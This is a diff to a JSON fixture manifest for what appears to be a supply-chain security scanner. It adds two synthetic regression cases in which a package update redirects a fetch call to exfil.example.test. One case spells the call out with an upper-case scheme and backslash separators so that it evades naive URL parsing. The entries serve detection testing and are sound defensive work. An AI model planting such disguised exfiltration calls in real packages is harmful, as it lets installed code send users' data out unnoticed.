@@ -1,5 +1,5 @@
 {
-  "notice": "DEFANGED SYNTHETIC RECONSTRUCTIONS (PLAN §7.4 fallback). Package names and versions are public identifiers from documented incidents; every file is synthetic, modeled on public analyses, and never the original artifact. Fixtures are parsed by tests only: never imported, installed, executed, or published. Hosts use .example.test, and commands are nonexistent fixture names.",
+  "notice": "DEFANGED SYNTHETIC RECONSTRUCTIONS (PLAN \u00a77.4 fallback). Package names and versions are public identifiers from documented incidents; every file is synthetic, modeled on public analyses, and never the original artifact. Fixtures are parsed by tests only: never imported, installed, executed, or published. Hosts use .example.test, and commands are nonexistent fixture names.",
   "incidents": [
     {
       "name": "axios-2026",
@@ -245,6 +245,39 @@
         "attack": {
           "base": ["ipv4-octal-hex-1.0.0"],
           "head": ["ipv4-octal-hex-1.0.1"]
+        }
+      }
+    },
+    {
+      "name": "scheme-forms",
+      "title": "Synthetic scheme-form endpoint (not a historical incident)",
+      "date": "n/a: regression for ADR-033",
+      "sources": [
+        "https://url.spec.whatwg.org/#special-scheme",
+        "https://url.spec.whatwg.org/#concept-url-parser"
+      ],
+      "kept": "The 1.0.1 bump swaps the fetch target from cdn.example.test to exfil.example.test, written with an upper-case scheme and a run of backslashes after the colon in the source: fetch(\"HTTPS:\\\\\\\\exfil.example.test/c\"), whose runtime value is HTTPS:\\\\exfil.example.test/c.",
+      "omitted": "Everything else: the package is a minimal synthetic stand-in. run() is never called and the reserved .example.test hosts are never contacted.",
+      "expected": "The extractor reports a HIGH new-external-endpoint for exfil.example.test, and the default HIGH gate fails.",
+      "scenarios": {
+        "attack": {
+          "base": ["scheme-forms-1.0.0"],
+          "head": ["scheme-forms-1.0.1"]
+        }
+      }
+    },
+    {
+      "name": "scheme-authority",
+      "title": "Synthetic authority separator and nested path regression",
+      "date": "n/a: regression for ADR-033",
+      "sources": [],
+      "kept": "The old destination includes an upper-case scheme in its path. The new destination uses slash and escaped backslash separators.",
+      "omitted": "All execution and network traffic. The fixture is parsed only and uses reserved .example.test hosts.",
+      "expected": "A HIGH new-external-endpoint for exfil.example.test.",
+      "scenarios": {
+        "attack": {
+          "base": ["scheme-authority-1.0.0"],
+          "head": ["scheme-authority-1.0.1"]
         }
       }
     }
